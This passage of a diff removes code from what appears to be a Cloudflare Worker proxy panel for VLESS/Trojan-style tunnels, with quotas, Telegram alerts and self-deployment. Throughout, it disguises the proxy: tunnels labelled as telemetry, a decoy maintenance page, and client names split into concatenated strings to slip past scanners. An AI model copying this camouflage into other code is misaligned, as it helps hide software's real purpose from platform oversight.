+  }
 }
-function sleepMs(ms) {
-    return new Promise((res) => setTimeout(res, ms));
-}
-// Bounded wait with timer cleanup: unlike fire-and-forget sleepMs races,
-// the timer is always cleared, so connect/probe attempts under a reconnect
-// storm cannot pin isolates awake (a past 1101 contributor).
-function withTimeout(promise, ms, label) {
-    let timer = null;
-    const gate = new Promise((_, rej) => {
-        timer = setTimeout(() => {
-            try {
-                rej(new Error(label || "timeout"));
-            } catch (e) {}
-        }, ms);
-    });
-    return Promise.race([promise, gate]).finally(() => {
-        try {
-            if (timer) clearTimeout(timer);
-        } catch (e) {}
-    });
-}
-// Hard deadlines for every TCP stage. cloudflare:sockets are not
-// AbortSignal-based, so fetch() timeouts do not cover them: each stage
-// needs its own deadline or a stalled relay hangs the request -> 1101.
-const TCP_OPEN_TIMEOUT_MS = 5000;
-const TCP_WRITE_TIMEOUT_MS = 5000;
-const TCP_FIRST_READ_TIMEOUT_MS = 7000;
-const UPSTREAM_WRITE_TIMEOUT_MS = 15000;
-const NAHAN_RUNNER_LEASE_TTL_MS = 120000;
-const UPSTREAM_QUEUE_MAX_BYTES = 4 * 1024 * 1024;
-const UPSTREAM_QUEUE_MAX_ITEMS = 256;
-function closeTcpSocketQuietly(socket) {
-    try {
-        if (socket && typeof socket.close === "function") socket.close();
-    } catch (e) {}
-}
-function releaseWriterQuietly(writer) {
-    try {
-        if (writer && typeof writer.releaseLock === "function")
-            writer.releaseLock();
-    } catch (e) {}
-}
-async function withDeadline(promise, timeoutMs, onTimeout, label = "operation") {
-    let timer = null;
-    let settled = false;
-    const timeoutPromise = new Promise((_, reject) => {
-        timer = setTimeout(() => {
-            if (settled) return;
-            try {
-                if (typeof onTimeout === "function") onTimeout();
-            } catch (e) {}
-            reject(new Error(`${label}-timeout`));
-        }, timeoutMs);
-    });
-    try {
-        return await Promise.race([promise, timeoutPromise]);
-    } finally {
-        settled = true;
-        if (timer) {
-            try {
-                clearTimeout(timer);
-            } catch (e) {}
-        }
-    }
-}
-async function writeSocketWithTimeout(
-    socket,
-    writer,
-    data,
-    timeoutMs = TCP_WRITE_TIMEOUT_MS,
-) {
-    if (!writer || typeof writer.write !== "function")
-        throw new Error("socket-writer-unavailable");
-    return await withDeadline(
-        writer.write(data),
-        timeoutMs,
-        () => closeTcpSocketQuietly(socket),
-        "socket-write",
-    );
-}
-let uuidUsage = new Map();
-let activeConns = new Map();
-let activeDeviceId = "";
-let configRegistry = new Map();
-
-let sysUsageCache = { users: {} };
-let lastSysUsageSync = 0;
-
-const CACHE_TTL_CONFIG = 10000;
-const CACHE_TTL_USAGE = 10000;
-const CACHE_TTL_BACKUP_IP = 30000;
-let sysConfigCacheTime = 0;
-let sysUsageCacheTime = 0;
-let backupIpCache = null;
-let backupIpCacheTime = 0;
-
-async function deployWorkerToCloudflare(accountId, apiToken, workerName, code) {
-    let currentBindings = [];
-    try {
-        const settingsRes = await fetchT(
-            `https://api.cloudflare.com/client/v4/accounts/${accountId}/workers/scripts/${encodeURIComponent(workerName)}/settings`,
-            { headers: { Authorization: `Bearer ${apiToken}` } },
-            30000,
-        );
-        const settingsJson = await settingsRes.json();
-        if (settingsJson.success && settingsJson.result?.bindings) {
-            currentBindings = settingsJson.result.bindings;
-        }
-    } catch (e) {}
-
-    const metadata = {
-        main_module: "_worker.js",
-        compatibility_date: "2024-03-01",
-        compatibility_flags: ["allow_eval_during_startup"],
-        bindings: currentBindings,
-    };
-
-    const form = new FormData();
-    form.append(
-        "metadata",
-        new Blob([JSON.stringify(metadata)], { type: "application/json" }),
-    );
-    form.append(
-        "_worker.js",
-        new Blob([code], { type: "application/javascript+module" }),
-        "_worker.js",
-    );
-
-    return await fetchT(
-        `https://api.cloudflare.com/client/v4/accounts/${accountId}/workers/scripts/${encodeURIComponent(workerName)}`,
-        {
-            method: "PUT",
-            headers: { Authorization: `Bearer ${apiToken}` },
-            body: form,
-        },
-        30000,
-    );
-}
-
-async function d1Init(env) {
-    if (env.IOT_DB && !env.IOT_DB_INITIALIZED) {
-        try {
-            await env.IOT_DB.prepare(
-                "CREATE TABLE IF NOT EXISTS kv_store (key TEXT PRIMARY KEY, value TEXT)",
-            ).run();
-            env.IOT_DB_INITIALIZED = true;
-        } catch (e) {
-            env.IOT_DB_INITIALIZED = true;
-        }
-    }
-}
-async function d1Get(env, key) {
-    if (!env.IOT_DB) return null;
-    await d1Init(env);
-    try {
-        const { results } = await env.IOT_DB.prepare(
-            "SELECT value FROM kv_store WHERE key = ?",
-        )
-            .bind(key)
-            .all();
-        if (results && results.length > 0) return results[0].value;
-    } catch (e) {}
-    return null;
-}
-async function d1Put(env, key, value) {
-    if (!env.IOT_DB) return;
-    await d1Init(env);
-    try {
-        await env.IOT_DB.prepare(
-            "INSERT INTO kv_store (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value=excluded.value",
-        )
-            .bind(key, value)
-            .run();
-    } catch (e) {}
-}
-
-async function cachedD1Put(env, key, value) {
-    await d1Put(env, key, value);
-    if (key === "sys_config") sysConfigCacheTime = 0;
-    else if (key === "sys_usage") sysUsageCacheTime = 0;
-    else if (key === "backup_ip") backupIpCacheTime = 0;
-}
-// Strict variant: failures propagate to the caller instead of being
-// swallowed. Burial/resurrection MUST use this: a silent persist failure
-// after live rotation was already changed means unrecoverable loss.
-async function d1PutStrict(env, key, value) {
-    if (!env.IOT_DB) throw new Error("d1-unavailable");
-    await d1Init(env);
-    await env.IOT_DB.prepare(
-        "INSERT INTO kv_store (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value=excluded.value",
-    )
-        .bind(key, value)
-        .run();
-}
-
-function sha224Hex(m) {
-    const msg = new TextEncoder().encode(m);
-    const K = [
-        0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1,
-        0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
-        0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786,
-        0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
-        0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147,
-        0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
-        0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b,
-        0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
-        0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a,
-        0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
-        0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
-    ];
-    let H = [
-        0xc1059ed8, 0x367cd507, 0x3070dd17, 0xf70e5939, 0xffc00b31, 0x68581511,
-        0x64f98fa7, 0xbefa4fa4,
-    ];
-    const words = [];
-    const n = Math.ceil((msg.length + 9) / 64) * 16;
-    for (let i = 0; i < n; i++) words[i] = 0;
-    for (let i = 0; i < msg.length; i++)
-        words[i >> 2] |= msg[i] << (24 - (i % 4) * 8);
-    words[msg.length >> 2] |= 0x80 << (24 - (msg.length % 4) * 8);
-    words[n - 1] = msg.length * 8;
-    const W = [];
-    for (let i = 0; i < n; i += 16) {
-        let [a, b, c, d, e, f, g, h] = H;
-        for (let j = 0; j < 64; j++) {
-            if (j < 16) W[j] = words[i + j];
-            else {
-                let w15 = W[j - 15],
-                    w2 = W[j - 2];
-                let s0 =
-                    ((w15 >>> 7) | (w15 << 25)) ^
-                    ((w15 >>> 18) | (w15 << 14)) ^
-                    (w15 >>> 3);
-                let s1 =
-                    ((w2 >>> 17) | (w2 << 15)) ^
-                    ((w2 >>> 19) | (w2 << 13)) ^
-                    (w2 >>> 10);
-                W[j] = (W[j - 16] + s0 + W[j - 7] + s1) >>> 0;
-            }
-            let S1 =
-                ((e >>> 6) | (e << 26)) ^
-                ((e >>> 11) | (e << 21)) ^
-                ((e >>> 25) | (e << 7));
-            let ch = (e & f) ^ (~e & g);
-            let temp1 = (h + S1 + ch + K[j] + W[j]) >>> 0;
-            let S0 =
-                ((a >>> 2) | (a << 30)) ^
-                ((a >>> 13) | (a << 19)) ^
-                ((a >>> 22) | (a << 10));
-            let maj = (a & b) ^ (a & c) ^ (b & c);
-            let temp2 = (S0 + maj) >>> 0;
-            h = g;
-            g = f;
-            f = e;
-            e = (d + temp1) >>> 0;
-            d = c;
-            c = b;
-            b = a;
-            a = (temp1 + temp2) >>> 0;
-        }
-        H[0] = (H[0] + a) >>> 0;
-        H[1] = (H[1] + b) >>> 0;
-        H[2] = (H[2] + c) >>> 0;
-        H[3] = (H[3] + d) >>> 0;
-        H[4] = (H[4] + e) >>> 0;
-        H[5] = (H[5] + f) >>> 0;
-        H[6] = (H[6] + g) >>> 0;
-        H[7] = (H[7] + h) >>> 0;
-    }
-    return H.slice(0, 7)
-        .map((v) => v.toString(16).padStart(8, "0"))
-        .join("");
-}
-const trojanHashCache = new Map();
-function getTrojanHash(uuid) {
-    if (trojanHashCache.has(uuid)) return trojanHashCache.get(uuid);
-    const hash = sha224Hex(uuid);
-    trojanHashCache.set(uuid, hash);
-    return hash;
-}
-
-function registerConfigEntry(uuid, userId, relayIp) {
-    const entry = { userId, relayIp: relayIp || "" };
-    configRegistry.set(uuid.replace(/-/g, "").toLowerCase(), entry);
-    const hashKey = getTrojanHash(uuid);
-    configRegistry.set(hashKey, entry);
-}
-
-function lookupConfigEntry(uuidHex) {
-    return configRegistry.get(uuidHex.toLowerCase()) || null;
-}
-
-function generateConfigUuid(originalUuid, relayIpIndex) {
-    const cleanUuid = originalUuid.replace(/-/g, "").toLowerCase();
-    const userPart = cleanUuid.substring(0, 24);
-    const relayPart = relayIpIndex.toString(16).padStart(8, "0");
-    const fullHex = userPart + relayPart;
-    return `${fullHex.substring(0, 8)}-${fullHex.substring(8, 12)}-${fullHex.substring(12, 16)}-${fullHex.substring(16, 20)}-${fullHex.substring(20, 32)}`;
-}
-
-function decodeConfigUuid(uuid) {
-    const cleanUuid = uuid.replace(/-/g, "").toLowerCase();
-    if (cleanUuid.length !== 32) return null;
-    const userFingerprint = cleanUuid.substring(0, 24);
-    const relayIpIndex = parseInt(cleanUuid.substring(24, 32), 16);
-    return { userFingerprint, relayIpIndex };
-}
-
-function isPanelApiKey(key) {
-    if (
-        !key ||
-        !sysConfig.panelApiKeys ||
-        !Array.isArray(sysConfig.panelApiKeys)
-    )
-        return false;
-    return sysConfig.panelApiKeys.some((k) => k.key === key);
-}
-
-function extractAuthKey(request, data) {
-    const authHeader = request.headers.get("Authorization") || "";
-    const authKey = authHeader.replace("Bearer ", "") || "";
-    let bodyKey = "";
-    if (data && typeof data === "object") bodyKey = data.key || "";
-    return authKey || bodyKey;
-}
-
-function isAuthorized(request, data) {
-    try {
-        const ip =
-            (request &&
-                request.headers &&
-                request.headers.get("cf-connecting-ip")) ||
-            "Unknown";
-        if (authBlocked(ip)) return false;
-        const key = extractAuthKey(request, data);
-        const ok =
-            key === sysConfig.masterKey || isPanelApiKey(key);
-        if (!ok) authFail(ip);
-        return ok;
-    } catch (e) {
-        return false;
-    }
-}
-
-function generateApiKey(name) {
-    const id = crypto.randomUUID();
-    const raw = `nahan_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 10)}`;
-    const key = raw;
-    return {
-        id,
-        name: name || "Unnamed Key",
-        key,
-        createdAt: Date.now(),
-        lastUsed: null,
-    };
-}
-
-function trackUsage(uuid, bytes, env, ctx) {
-    if (!sysUsageCache) sysUsageCache = { users: {} };
-    if (!sysUsageCache.users) sysUsageCache.users = {};
-    if (!sysUsageCache.users[uuid])
-        sysUsageCache.users[uuid] = {
-            reqs: 0,
-            dReqs: 0,
-            bytes: 0,
-            dBytes: 0,
-            lastDay: new Date().toISOString().split("T")[0],
-        };
-
-    let u = sysUsageCache.users[uuid];
-    let today = new Date().toISOString().split("T")[0];
-    if (u.lastDay !== today) {
-        u.dReqs = 0;
-        u.dBytes = 0;
-        u.lastDay = today;
-    }
-    if (u.reqs === undefined) u.reqs = 0;
-    if (u.dReqs === undefined) u.dReqs = 0;
-    // One-time migration for rows written before byte accounting existed.
-    if (typeof u.bytes !== "number" || u.bytes < 0)
-        u.bytes = Math.floor((u.reqs || 0) * REQ_BYTES_EST);
-    if (typeof u.dBytes !== "number" || u.dBytes < 0)
-        u.dBytes =
-            u.lastDay === today
-                ? Math.floor((u.dReqs || 0) * REQ_BYTES_EST)
-                : 0;
-
-    if (bytes === 0) {
-        u.reqs += 1;
-        u.dReqs += 1;
-    } else if (typeof bytes === "number" && bytes > 0) {
-        u.bytes += Math.floor(bytes);
-        u.dBytes += Math.floor(bytes);
-    }
-
-    const now = Date.now();
-    if (now - lastSysUsageSync > 30000) {
-        lastSysUsageSync = now;
-        if (env && env.IOT_DB) {
-            let changedConfig = false;
-            if (sysConfig.users && sysConfig.users.length > 0) {
-                sysConfig.users.forEach((u) => {
-                    let uId = u.id.replace(/-/g, "").toLowerCase();
-                    let sysU = sysUsageCache.users[uId];
-                    if (!u.isPaused) {
-                        let reason = null;
-                        if (u.expiryMs && Date.now() > u.expiryMs) {
-                            reason = `Expiration date reached (${new Date(u.expiryMs).toLocaleDateString()})`;
-                        } else if (
-                            sysU &&
-                            u.limitTotalReq &&
-                            usageTotalBytes(sysU) >=
-                                limitReqToBytes(u.limitTotalReq)
-                        ) {
-                            let usedGB = (
-                                usageTotalBytes(sysU) / 1073741824
-                            ).toFixed(2);
-                            let limitGB = (
-                                limitReqToBytes(u.limitTotalReq) /
-                                1073741824
-                            ).toFixed(2);
-                            reason = `Traffic limit exceeded (${usedGB}GB / ${limitGB}GB)`;
-                        }
-                        if (reason) {
-                            u.isPaused = true;
-                            u.disabledReason = reason;
-                            u.disabledAt = Date.now();
-                            changedConfig = true;
-                            ctx?.waitUntil(
-                                logActivity(
-                                    env,
-                                    "User Auto-Disabled",
-                                    `User "${u.name}" (${u.id}) disabled: ${reason}`,
-                                ).catch(() => {}),
-                            );
-                            if (
-                                sysConfig.tgToken &&
-                                (sysConfig.tgAdminId || sysConfig.tgChatId)
-                            ) {
-                                const tgMsg = `⚠️ <b>User Auto-Disabled</b>\n\n👤 <b>User:</b> ${u.name}\n🆔 <b>ID:</b> <code>${u.id}</code>\n📝 <b>Reason:</b> ${reason}`;
-                                const notifyChatId =
-                                    sysConfig.tgAdminId || sysConfig.tgChatId;
-                                ctx?.waitUntil(
-                                    fetchT(
-                                        `https://api.telegram.org/bot${sysConfig.tgToken}/sendMessage`,
-                                        {
-                                            method: "POST",
-                                            headers: {
-                                                "Content-Type":
-                                                    "application/json",
-                                            },
-                                            body: JSON.stringify({
-                                                chat_id: notifyChatId,
-                                                text: tgMsg,
-                                                parse_mode: "HTML",
-                                            }),
-                                        },
-                                    ).catch(() => {}),
-                                );
-                            }
-                        }
-                    }
-                });
-            }
-
-            if (changedConfig) {
-                ctx?.waitUntil(
-                    cachedD1Put(
-                        env,
-                        "sys_config",
-                        JSON.stringify(sysConfig),
-                    ).catch(() => {}),
-                );
-            }
-            ctx?.waitUntil(
-                cachedD1Put(
-                    env,
-                    "sys_usage",
-                    JSON.stringify(sysUsageCache),
-                ).catch(() => {}),
-            );
-        }
-    }
-}
-
-export default {
-    async fetch(request, env, ctx) {
-        try {
-            if (!isolateStartTime) isolateStartTime = Date.now();
-            try {
-                INFLIGHT_HTTP++;
-            } catch (e) {}
-            // NOTE: INFLIGHT_HTTP is decremented in the fetch finally block
-            // at the end of this handler, never here: decrementing it in a
-            // microtask right after increment made the breaker permanently
-            // blind (always ~0) so load shedding never engaged.
-            if (configRegistry.size > 10000) { configRegistry.clear(); trojanHashCache.clear(); }
-            await loadSysConfig(env, ctx);
-            // Background self-healing sweep (throttled): dead-relay probes
-            // + graveyard re-probes run in waitUntil, never blocking responses.
-            try {
-                const nowRs = Date.now();
-                if (nowRs - lastRelaySweep > 60000) {
-                    lastRelaySweep = nowRs;
-                    if (ctx && typeof ctx.waitUntil === "function") {
-                        ctx.waitUntil(
-                            (async () => {
-                                try {
-                                    await probeDeadRelays(env);
-                                } catch (e) {}
-                                try {
-                                    await probeGraveyard(env);
-                                } catch (e) {}
-                            })(),
-                        );
-                    }
-                }
-            } catch (e) {}
-            activeDeviceId =
-                sysConfig.deviceId || generateHardwareId(sysConfig.apiRoute);
-
-            const url = new URL(request.url);
-            const upgradeHeader = request.headers.get("Upgrade");
-            const isTelemetryStream =
-                upgradeHeader && upgradeHeader.toLowerCase() === "websocket";
-
-            let reqPath = url.pathname;
-            if (reqPath.endsWith("/") && reqPath.length > 1)
-                reqPath = reqPath.slice(0, -1);
-
-            const routes = {
-                data: `/${encodeURI(sysConfig.apiRoute)}`,
-                dash: `/${encodeURI(sysConfig.apiRoute)}/dash`,
-                auth: `/${encodeURI(sysConfig.apiRoute)}/api/auth`,
-                sync: `/${encodeURI(sysConfig.apiRoute)}/api/sync`,
-                tg: `/${encodeURI(sysConfig.apiRoute)}/tg`,
-                syncPanel: `/${encodeURI(sysConfig.apiRoute)}/tg/sync_panel`,
-                logs: `/${encodeURI(sysConfig.apiRoute)}/api/logs`,
-                users: `/${encodeURI(sysConfig.apiRoute)}/api/users`,
-                stats: `/${encodeURI(sysConfig.apiRoute)}/api/stats`,
-                update: `/${encodeURI(sysConfig.apiRoute)}/api/update`,
-                apiKeys: `/${encodeURI(sysConfig.apiRoute)}/api/keys`,
-            };
-
-            const isSyncRoute = reqPath.endsWith("/api/sync");
-            const isUsersRoute =
-                reqPath === routes.users || reqPath.endsWith("/api/users");
-            const isStatsRoute =
-                reqPath === routes.stats || reqPath.endsWith("/api/stats");
-            const isUpdateRoute =
-                reqPath === routes.update || reqPath.endsWith("/api/update");
-            const isApiKeysRoute =
-                reqPath === routes.apiKeys || reqPath.endsWith("/api/keys");
-            const isAuthorizedRoute =
-                reqPath === routes.data ||
-                reqPath === routes.dash ||
-                reqPath === routes.auth ||
-                reqPath === routes.sync ||
-                reqPath === routes.tg ||
-                reqPath === routes.syncPanel ||
-                reqPath === routes.logs ||
-                isSyncRoute ||
-                isUsersRoute ||
-                isStatsRoute ||
-                isUpdateRoute ||
-                isApiKeysRoute;
-
-            if (!isTelemetryStream && !isAuthorizedRoute) {
-                return serveMaintenancePage(request, url);
-            }
-
-            // Maintenance mode (sysConfig.maintenanceMode): admin APIs stay
-            // open, already-open tunnels are unaffected (they are upgraded),
-            // but new tunnels and sub refreshes get a polite 503.
-            // Toggle by POSTing {"key":...,"config":{"maintenanceMode":true}}
-            // to /<apiRoute>/api/sync (merged, survives dashboard syncs).
-            if (
-                sysConfig.maintenanceMode &&
-                (isTelemetryStream || reqPath === routes.data)
-            ) {
-                if (isTelemetryStream)
-                    return new Response(null, { status: 503 });
-                return new Response(
-                    "Maintenance in progress, retry later",
-                    {
-                        status: 503,
-                        headers: { "Retry-After": "120" },
-                    },
-                );
-            }
-
-            if (!isTelemetryStream) {
-                if (reqPath === routes.dash) {
-                    const dashboardUrl = env.DASHBOARD_URL || 'https://raw.githubusercontent.com/itsyebekhe/nahan/main/dashboard.html';
-                    try {
-                        const resp = await fetchT(dashboardUrl);
-                        let html = await resp.text();
-                        html = html.replace(/__CURRENT_VERSION__/g, CURRENT_VERSION);
-                        if (env.IOT_DB !== undefined) {
-                            html = html.replace('__HAS_DB_WARNING__', '');
-                        } else {
-                            html = html.replace('__HAS_DB_WARNING__', '<div class="mb-5 p-4 rounded-2xl flex items-start gap-3" style="background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.2);"><span style="color:#f87171;">&#9888;&#65039;</span><span class="text-sm" style="color:#fca5a5;" data-i18n="missing_db">Database not connected. Settings won\'t be saved.</span></div>');
-                        }
-                        return new Response(html, {
-                            headers: { "Content-Type": "text/html;charset=utf-8" },
-                        });
-                    } catch (e) {
-                        return new Response('Failed to load dashboard', { status: 502 });
-                    }
-                }
-                if (reqPath === routes.auth) {
-                    if (request.method !== "POST")
-                        return new Response("405", { status: 405 });
-                    return await handleAuth(request, url.hostname, ctx, env);
-                }
-                if (reqPath === routes.sync || isSyncRoute) {
-                    if (request.method === "OPTIONS") {
-                        return new Response(null, {
-                            status: 204,
-                            headers: {
-                                "Access-Control-Allow-Origin": "*",
-                                "Access-Control-Allow-Methods": "POST, OPTIONS",
-                                "Access-Control-Allow-Headers":
-                                    "Content-Type, Authorization",
-                                "Access-Control-Max-Age": "86400",
-                            },
-                        });
-                    }
-                    if (request.method !== "POST")
-                        return new Response("405", { status: 405 });
-                    const syncRes = await handleConfigSync(request, env, ctx);
-                    syncRes.headers.set("Access-Control-Allow-Origin", "*");
-                    syncRes.headers.set(
-                        "Access-Control-Allow-Headers",
-                        "Content-Type, Authorization",
-                    );
-                    return syncRes;
-                }
-                if (reqPath === routes.logs) {
-                    if (request.method !== "POST" && request.method !== "GET")
-                        return new Response("405", { status: 405 });
-                    return await handleLogs(request, env);
-                }
-                if (isUsersRoute) {
-                    return await handleUsersApi(request, env, ctx);
-                }
-                if (isStatsRoute) {
-                    return await handleStatsApi(request, env);
-                }
-                if (isUpdateRoute) {
-                    return await handleUpdateApi(request, env, ctx);
-                }
-                if (isApiKeysRoute) {
-                    return await handleApiKeys(request, env, ctx);
-                }
-                if (reqPath === routes.syncPanel) {
-                    if (request.method !== "POST")
-                        return new Response("405", { status: 405 });
-                    return await handleSyncPanel(request, env, ctx);
-                }
-                if (reqPath === routes.tg) {
-                    if (request.method !== "POST")
-                        return new Response("405", { status: 405 });
-                    return await handleTelegramWebhook(
-                        request,
-                        env,
-                        url.hostname,
-                        ctx,
-                    );
-                }
-                if (reqPath === routes.data) {
-                    const ua = (
-                        request.headers.get("User-Agent") || ""
-                    ).toLowerCase();
-                    const isCustomUaAllowed =
-                        sysConfig.subUserAgent &&
-                        sysConfig.subUserAgent.trim().length > 0 &&
-                        ua.includes(
-                            sysConfig.subUserAgent.trim().toLowerCase(),
-                        );
-                    const clientHost =
-                        request.headers.get("Host") || url.hostname;
-                    let targetSub = url.searchParams.get("sub");
-                    let hasMultiUser =
-                        sysConfig.users && sysConfig.users.length > 0;
-
-                    let targetUser = null;
-                    let isValidUser = false;
-                    if (hasMultiUser) {
-                        if (targetSub) {
-                            targetUser = sysConfig.users.find(
-                                (u) =>
-                                    u.name.toLowerCase() ===
-                                        targetSub.toLowerCase() ||
-                                    u.id === targetSub,
-                            );
-                            if (targetUser) isValidUser = true;
-                        }
-                    } else {
-                        isValidUser = true;
-                        targetUser = { id: activeDeviceId, name: "Default" };
-                    }
-
-                    const acceptHeader = (
-                        request.headers.get("Accept") || ""
-                    ).toLowerCase();
-                    const secFetchDest = (
-                        request.headers.get("Sec-Fetch-Dest") || ""
-                    ).toLowerCase();
-
-                    const isRealBrowser =
-                        (secFetchDest === "document" ||
-                            acceptHeader.includes("text/html")) &&
-                        (ua.includes("mozilla") ||
-                            ua.includes("chrome") ||
-                            ua.includes("safari") ||
-                            ua.includes("applewebkit") ||
-                            ua.includes("gecko") ||
-                            ua.includes("opera") ||
-                            ua.includes("edge")) &&
-                        !ua.includes("cla" + "sh") &&
-                        !ua.includes("si" + "ng-box") &&
-                        !ua.includes("v" + "2r" + "ay") &&
-                        !ua.includes("shadow" + "rocket") &&
-                        !ua.includes("quantum" + "ult") &&
-                        !ua.includes("surf" + "board") &&
-                        !ua.includes("sta" + "sh");
-
-                    if (isRealBrowser && !isCustomUaAllowed) {
-                        if (isValidUser) {
-                            const subscriptionUrl = env.SUBSCRIPTION_URL || 'https://raw.githubusercontent.com/itsyebekhe/nahan/main/subscription.html';
-                            try {
-                                const resp = await fetchT(subscriptionUrl);
-                                let html = await resp.text();
-                                // Compute dynamic values
-                                const idClean = targetUser.id.replace(/-/g, '').toLowerCase();
-                                const sysU = sysUsageCache?.users?.[idClean] || { reqs: 0, dReqs: 0, lastDay: '' };
-                                const totalReqs = sysU.reqs || 0;
-                                const todayDate = new Date().toISOString().split('T')[0];
-                                const dailyReqs = sysU.lastDay === todayDate ? (sysU.dReqs || 0) : 0;
-                                const limitTotal = targetUser.limitTotalReq || 0;
-                                const limitDaily = targetUser.limitDailyReq || 0;
-                                const totalBytesUsed = usageTotalBytes(sysU);
-                                const dailyBytesUsed = usageDailyBytes(sysU, todayDate);
-                                const limitTotalBytes = limitReqToBytes(limitTotal);
-                                const limitDailyBytes = limitReqToBytes(limitDaily);
-                                const totalGb = (totalBytesUsed / 1073741824).toFixed(2);
-                                const limitTotalGb = limitTotal ? (limitTotalBytes / 1073741824).toFixed(2) : '9999';
-                                const dailyGb = (dailyBytesUsed / 1073741824).toFixed(2);
-                                const limitDailyGb = limitDaily ? (limitDailyBytes / 1073741824).toFixed(2) : '9999';
-                                const totalPercent = limitTotal ? Math.min(100, (totalBytesUsed / limitTotalBytes) * 100).toFixed(1) : '0';
-                                const dailyPercent = limitDaily ? Math.min(100, (dailyBytesUsed / limitDailyBytes) * 100).toFixed(1) : '0';
-                                let expiryDateTxt = '2099-01-01';
-                                let isExpired = false;
-                                if (targetUser.expiryMs) {
-                                    expiryDateTxt = new Date(targetUser.expiryMs).toISOString().split('T')[0];
-                                    if (Date.now() > targetUser.expiryMs) isExpired = true;
-                                }
-                                let statusCode = 'active';
-                                if (targetUser.isPaused) statusCode = 'paused';
-                                else if (isExpired) statusCode = 'expired';
-                                else if (limitTotal && totalBytesUsed >= limitTotalBytes) statusCode = 'limit';
-                                else if (limitDaily && dailyBytesUsed >= limitDailyBytes) statusCode = 'dailyLimit';
-                                let cleanUrl = new URL(url.href);
-                                let panelUrlToUse = sysConfig.customPanelUrl;
-                                if (targetUser.userPanelUrl && targetUser.userPanelUrl.trim()) panelUrlToUse = targetUser.userPanelUrl.trim();
-                                if (panelUrlToUse) {
-                                    let customUrlStr = panelUrlToUse;
-                                    if (!customUrlStr.startsWith('http://') && !customUrlStr.startsWith('https://')) customUrlStr = 'https://' + customUrlStr;
-                                    try { const customUrl = new URL(customUrlStr); cleanUrl.protocol = customUrl.protocol; cleanUrl.host = customUrl.host; } catch(e) {}
-                                }
-                                cleanUrl.searchParams.delete('flag'); cleanUrl.searchParams.delete('format');
-                                cleanUrl.searchParams.delete('type'); cleanUrl.searchParams.delete('output'); cleanUrl.searchParams.delete('raw');
-                                const syncNormal = cleanUrl.href;
-                                const syncRaw = cleanUrl.href + (cleanUrl.href.includes('?') ? '&flag=a' : '?flag=a');
-                                // Total progress bar
-                                let totalProgress = '';
-                                if (limitTotal) {
-                                    totalProgress = `<div class="w-full rounded-full h-1.5 mt-3 overflow-hidden progress-bar-bg"><div class="h-1.5 rounded-full" style="background: var(--accent); width: ${totalPercent}%;"></div></div><p class="text-[10px] text-muted text-right mt-1.5" data-i18n="used">${totalPercent}% Used</p>`;
-                                } else {
-                                    totalProgress = '<p class="text-[10px] text-muted mt-2" data-i18n="unlimitedPlan">Unlimited Plan</p>';
-                                }
-                                // Daily progress bar
-                                let dailyProgress = '';
-                                if (limitDaily) {
-                                    dailyProgress = `<div class="w-full rounded-full h-1.5 mt-3 overflow-hidden progress-bar-bg"><div class="h-1.5 rounded-full" style="background: var(--amber-text); width: ${dailyPercent}%;"></div></div><p class="text-[10px] text-muted text-right mt-1.5" data-i18n="used">${dailyPercent}% Used</p>`;
-                                } else {
-                                    dailyProgress = '<p class="text-[10px] text-muted mt-2" data-i18n="noDailyLimit">No Daily Limit</p>';
-                                }
-                                // Replace placeholders
-                                html = html.replace(/__USER_NAME__/g, targetUser.name);
-                                html = html.replace(/__USER_ID__/g, targetUser.id);
-                                html = html.replace(/__STATUS_CODE__/g, statusCode);
-                                html = html.replace(/__TOTAL_GB__/g, totalGb);
-                                html = html.replace(/__LIMIT_TOTAL_GB__/g, limitTotalGb);
-                                html = html.replace(/__TOTAL_PERCENT__/g, totalPercent);
-                                html = html.replace(/__DAILY_GB__/g, dailyGb);
-                                html = html.replace(/__LIMIT_DAILY_GB__/g, limitDailyGb);
-                                html = html.replace(/__DAILY_PERCENT__/g, dailyPercent);
-                                html = html.replace(/__EXPIRY_DATE__/g, expiryDateTxt);
-                                html = html.replace(/__SYNC_NORMAL__/g, syncNormal);
-                                html = html.replace(/__SYNC_RAW__/g, syncRaw);
-                                html = html.replace(/__TOTAL_PROGRESS__/g, totalProgress);
-                                html = html.replace(/__DAILY_PROGRESS__/g, dailyProgress);
-                                return new Response(html, { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
-                            } catch (e) {
-                                return new Response('Failed to load subscription page', { status: 502 });
-                            }
-                        } else {
-                            return serveMaintenancePage(request, url);
-                        }
-                    }
-
-                    if (hasMultiUser && !isValidUser) {
-                        return new Response(
-                            "Error: Default profile sync is disabled when multi-user is active.",
-                            { status: 403 },
-                        );
-                    }
-
-                    // Breaker L2: shed client sub refreshes under extreme
-                    // load (browsers still get the info page above, open
-                    // tunnels are unaffected).
-                    try {
-                        if (breakerLevel() >= 2 && !isRealBrowser) {
-                            return new Response(
-                                "Server busy, retry later",
-                                {
-                                    status: 429,
-                                    headers: { "Retry-After": "60" },
-                                },
-                            );
-                        }
-                    } catch (e) {}
-
-                    const allowInsecure =
-                        url.searchParams.get("insecure") === "true" ||
-                        url.searchParams.get("allowInsecure") === "true" ||
-                        url.searchParams.get("allow_insecure") === "1" ||
-                        url.searchParams.get("allowInsecure") === "1";
-
-                    const resHeaders = new Headers();
-                    resHeaders.set("Cache-Control", "no-store");
